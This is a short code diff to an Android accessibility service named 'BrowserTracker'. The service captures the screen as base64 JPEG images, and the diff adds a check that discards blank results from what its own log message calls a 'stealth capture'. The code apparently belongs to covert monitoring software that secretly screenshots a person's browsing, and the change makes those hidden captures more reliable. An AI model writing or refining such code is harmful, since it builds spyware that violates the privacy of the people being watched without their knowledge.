@@ -124,7 +124,12 @@ class BrowserTracker : AccessibilityService() {
                                     bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                                     val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                                     bitmap.recycle()
-                                    callback(base64)
+                                    if (base64.length > 2500) {
+                                        callback(base64)
+                                    } else {
+                                        Log.w("BrowserTracker", "Stealth capture produced blank image (${base64.length} chars)")
+                                        callback(null)
+                                    }
                                 } else {
                                     callback(null)
                                 }
